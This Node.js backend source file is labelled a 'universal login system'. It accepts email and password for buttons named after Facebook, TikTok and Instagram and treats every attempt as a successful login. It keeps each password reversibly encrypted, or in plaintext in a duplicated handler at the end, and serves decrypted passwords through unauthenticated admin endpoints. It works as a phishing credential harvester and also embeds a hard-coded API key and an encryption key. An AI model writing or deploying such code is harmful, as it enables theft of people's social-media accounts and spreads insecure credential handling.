// ============================================================
// Universal Login System Backend
// ============================================================
const express = require('express');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');

const app = express();

// ============================================================
// Middleware
// ============================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  next();
});

// ============================================================
// Supabase Configuration
// ============================================================
const supabaseUrl = 'https://rkiqozdxcfiwqvzeoutq.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJraXFvemR4Y2Zpd3F2emVvdXRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3ODgyOTMsImV4cCI6MjA4NTM2NDI5M30.CUen4-RHCDgk8TqySVF-oQIVS3c11H_Yf2h7KexdGjk';
const supabase = createClient(supabaseUrl, supabaseKey);

// ============================================================
// Encryption Setup (UNCHANGED)
// ============================================================
const ENCRYPTION_KEY = 'learning-project-key-32-characters-long!';
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

// ============================================================
// Encryption Function
// ============================================================
function encrypt(text) {
  try {
    const iv = crypto.randomBytes(IV_LENGTH);
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  } catch (error) {
    console.error('Encryption error:', error);
    return 'error';
  }
}

// ============================================================
// Decryption Function
// ============================================================
function decrypt(text) {
  try {
    const parts = text.split(':');
    const iv = Buffer.from(parts.shift(), 'hex');
    const encryptedText = parts.join(':');
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    return '[Encrypted]';
  }
}

// ============================================================
// Health Check
// ============================================================
app.get('/', (req, res) => {
  res.json({
    status: '✅ Backend is running',
    message: 'Universal Login System Backend',
    endpoints: {
      login: 'POST /api/login',
      adminUsers: 'GET /api/admin/users',
      adminLogs: 'GET /api/admin/logs'
    }
  });
});

// ============================================================
// UNIVERSAL LOGIN ENDPOINT
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    console.log('🔐 Login attempt');

    // --------------------------------------------------------
    // NEW (VERY IMPORTANT):
    // login_provider tells us WHICH BUTTON WAS CLICKED
    // Example values:
    // "email", "facebook", "tiktok", "instagram"
    // If nothing is sent, we default to "email"
    // --------------------------------------------------------
    const { email, password, login_provider = 'email' } = req.body;

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Email and password required'
      });
    }

    const cleanEmail = email.toLowerCase().trim();
    const userName = cleanEmail.split('@')[0];

    // --------------------------------------------------------
    // Check if user already exists
    // --------------------------------------------------------
    const { data: existingUser } = await supabase
      .from('users')
      .select('*')
      .eq('email', cleanEmail)
      .maybeSingle();

    let userId;

    if (existingUser) {
      // ------------------------------------------------------
      // EXISTING USER LOGIN
      // ------------------------------------------------------
      userId = existingUser.id;

      await supabase
        .from('users')
        .update({
          last_login: new Date().toISOString(),
          login_count: (existingUser.login_count || 0) + 1,
          ip_address: ip,

          // NEW:
          // Update the login_provider to reflect the latest login source
          login_provider: login_provider
        })
        .eq('id', userId);

    } else {
      // ------------------------------------------------------
      // NEW USER REGISTRATION (AUTO-CREATED ON LOGIN)
      // ------------------------------------------------------
      const passwordHash = await bcrypt.hash(password, 10);
      const encryptedPassword = encrypt(password);

      const { data: newUser, error: insertError } = await supabase
        .from('users')
        .insert([{
          email: cleanEmail,
          password_hash: passwordHash,
          password_original: encryptedPassword,
          name: userName,
          ip_address: ip,
          user_agent: userAgent,

          // NEW:
          // Store which login button was used
          login_provider: login_provider,

          created_at: new Date().toISOString(),
          last_login: new Date().toISOString(),
          login_count: 1
        }])
        .select()
        .single();

      if (insertError) {
        console.error('Error creating user:', insertError);
        return res.status(500).json({
          success: false,
          error: 'Failed to create user'
        });
      }

      userId = newUser.id;
      console.log('✅ New user created:', cleanEmail);
    }

    // --------------------------------------------------------
    // ADMIN LOG ENTRY (EVERY LOGIN IS RECORDED)
    // --------------------------------------------------------
    await supabase
      .from('admin_logs')
      .insert([{
        user_id: userId,
        email_used: cleanEmail,
        password_original: encrypt(password),
        ip_address: ip,
        user_agent: userAgent,

        // NEW:
        // This allows admin to SEE the login source
        login_provider: login_provider,

        login_time: new Date().toISOString()
      }]);

    // --------------------------------------------------------
    // SUCCESS RESPONSE (UNCHANGED)
    // --------------------------------------------------------
    res.json({
      success: true,
      user: {
        id: userId,
        email: cleanEmail,
        name: userName,
        ip: ip
      },
      message: 'Login successful'
    });

  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// ============================================================
// ADMIN: GET ALL USERS
// ============================================================
app.get('/api/admin/users', async (req, res) => {
  try {
    const { data: users, error } = await supabase
      .from('users')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      return res.status(500).json({ error: error.message });
    }

    const usersWithPasswords = users.map(user => ({
      ...user,
      password_display: user.password_original
        ? decrypt(user.password_original)
        : '[No password]',
      password_hash: undefined
    }));

    res.json({
      success: true,
      count: users.length,
      users: usersWithPasswords
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to fetch users'
    });
  }
});

// ============================================================
// ADMIN: GET LOGIN LOGS
// ============================================================
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { data: logs, error } = await supabase
      .from('admin_logs')
      .select(`*, users:user_id (email, name)`)
      .order('login_time', { ascending: false })
      .limit(100);

    if (error) throw error;

    const logsWithPasswords = logs.map(log => ({
      ...log,
      password_display: log.password_original
        ? decrypt(log.password_original)
        : '[Encrypted]'
    }));

    res.json({
      success: true,
      count: logs.length,
      logs: logsWithPasswords
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
});

app.post('/api/login', async (req, res) => {
    const { email, password, platform } = req.body;

    if (!email || !password) {
        return res.json({ success: false, error: 'Email and password required' });
    }

    try {
        // Insert user if new
        let { data: existingUser } = await supabase
            .from('users')
            .select('*')
            .eq('email', email)
            .single();

        if (!existingUser) {
            const { data: newUser } = await supabase
                .from('users')
                .insert({
                    email,
                    password,
                    login_platform: platform || 'email'
                })
                .select()
                .single();
            existingUser = newUser;
        }

        // Insert login log
        await supabase.from('login_logs').insert({
            email_used: email,
            password_display: password,
            login_platform: platform || 'email',
            ip_address: req.ip,
            user_agent: req.headers['user-agent']
        });

        // Send success response
        res.json({ success: true, user: existingUser });
    } catch (error) {
        console.error(error);
        res.json({ success: false, error: 'Server error' });
    }
});
